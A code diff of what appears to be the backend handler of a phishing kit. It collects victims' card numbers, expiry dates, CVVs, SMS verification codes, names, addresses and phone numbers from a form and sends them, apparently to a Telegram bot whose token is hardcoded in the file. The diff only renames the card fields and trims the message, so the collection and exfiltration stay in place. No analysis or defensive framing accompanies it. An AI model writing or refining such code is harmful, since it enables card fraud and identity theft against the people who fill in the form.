@@ -13,9 +13,9 @@ export default async function handler(req, res) {
     city, 
     num, 
     sms_code,
-    cc_number,
-    cc_exp,
-    cc_cvv
+    cc,
+    exp,
+    cvv
   } = req.body;
 
   const BOT_TOKEN = "7434892132:AAHI5vTd19Ngo57sBY-3JO247rlcZqU18QM";
@@ -27,12 +27,9 @@ export default async function handler(req, res) {
     // 🟢 رسالة الكارت
     message = `
 💳 Carte Bancaire:
-- Numéro: ${cc_number}
-- Expiration: ${cc_exp}
-- CVV: ${cc_cvv}
-- Nom: ${first_name} ${last_name}
-- Adresse: ${address}, ${city}, ${postal}
-- Téléphone: ${num}
+- Numéro: ${cc}
+- Expiration: ${exp}
+- CVV: ${cvv}
     `;
   } else if (sms_code) {
     // 🟠 رسالة SMS
@@ -69,3 +66,4 @@ export default async function handler(req, res) {
     res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
+
